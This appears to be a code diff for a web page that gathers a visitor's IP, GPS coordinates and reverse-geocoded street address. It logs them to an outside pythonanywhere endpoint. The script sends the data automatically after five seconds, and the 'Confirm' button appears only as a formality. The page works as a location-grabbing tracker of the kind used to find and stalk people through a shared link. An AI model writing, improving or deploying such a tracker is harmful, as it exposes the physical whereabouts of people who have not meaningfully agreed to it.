@@ -4,19 +4,41 @@
     <title>Location Access</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background:#f0f2f5; }
-        .card { background:white; padding:30px; border-radius:10px; text-align:center; }
-        button { padding:10px 20px; font-size:16px; cursor:pointer; }
+        body {
+            font-family: sans-serif;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            height:100vh;
+            background:#f0f2f5;
+        }
+        .card {
+            background:white;
+            padding:30px;
+            border-radius:10px;
+            text-align:center;
+            width:90%;
+            max-width:400px;
+        }
+        button {
+            padding:10px 20px;
+            font-size:16px;
+            margin-top:10px;
+            cursor:pointer;
+        }
     </style>
 </head>
 <body>
+
 <div class="card">
     <h3>Share Your Location</h3>
     <p>This site will collect your location.</p>
+
     <button onclick="start()">Allow & Continue</button>
+
     <p id="status"></p>
     <div id="result" style="margin-top:15px;"></div>
-<button id="confirmBtn" onclick="confirmSend()" style="display:none;">Confirm</button>
+    <button id="confirmBtn" onclick="confirmSend()" style="display:none;">Confirm</button>
 </div>
 
 <script>
@@ -28,6 +50,7 @@ async function start() {
 
     let data = { ip: "0.0.0.0", lat: "0", lon: "0", type: "IP-Only" };
 
+    // Get IP fallback
     try {
         const res = await fetch('https://ipapi.co/json/');
         const json = await res.json();
@@ -35,46 +58,71 @@ async function start() {
         data.lat = json.latitude;
         data.lon = json.longitude;
     } catch(e) {}
-    <div id="result" style="margin-top:15px;"></div>
-<button id="confirmBtn" onclick="confirmSend()" style="display:none;">Confirm</button>
-}
-    
-if (navigator.geolocation) {
-    let gpsDone = false;
 
-    navigator.geolocation.getCurrentPosition(
-        (pos) => {
-            gpsDone = true;
-            data.lat = pos.coords.latitude;
-            data.lon = pos.coords.longitude;
-            data.type = "GPS";
-            sendData();
-        },
-        (err) => {
-            gpsDone = true;
-            console.log("GPS failed");
-            sendData();
-        },
-        { enableHighAccuracy: true, timeout: 8000 }
-    );
-
-    // 🔥 Backup: if GPS hangs, send after 9 sec
-    setTimeout(() => {
-        if (!gpsDone) {
-            console.log("GPS timeout fallback");
-            sendData();
-        }
-    }, 9000);
-
-} else {
-    sendData();
-}
-    
+    // Try GPS
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                data.lat = pos.coords.latitude;
+                data.lon = pos.coords.longitude;
+                data.type = "GPS";
+                processData(data);
+            },
+            () => {
+                processData(data);
+            },
+            { enableHighAccuracy: true, timeout: 8000 }
+        );
+    } else {
+        processData(data);
     }
 
+    // Backup trigger
+    setTimeout(() => {
+        processData(data);
+    }, 9000);
+}
 
+async function processData(data) {
+    if (sent) return;
+    sent = true;
+
+    let address = "Unknown";
+
+    try {
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.lat}&lon=${data.lon}`);
+        const json = await res.json();
+        address = json.display_name;
+
+        document.getElementById("result").innerText = "Detected: " + address;
+        document.getElementById("confirmBtn").style.display = "block";
+
+    } catch (e) {
+        console.log("Address fetch failed");
+    }
+
+    // Auto send after 5 sec
+    setTimeout(() => {
+        sendToServer(data, address);
+    }, 5000);
+}
+
+function sendToServer(data, address) {
+    const url = `https://${PA_USER}.pythonanywhere.com/log?lat=${data.lat}&lon=${data.lon}&ip=${data.ip}&type=${data.type}&address=${encodeURIComponent(address)}`;
+
+    fetch(url).then(() => {
+        document.getElementById("status").innerText = "Sent ✅";
+    }).catch(() => {
+        document.getElementById("status").innerText = "Error";
+    });
+}
+
+function confirmSend() {
+    const address = document.getElementById("result").innerText.replace("Detected: ", "");
+    sendToServer({lat:"", lon:"", ip:"", type:"Manual"}, address);
 }
 </script>
+
 </body>
 </html>
 
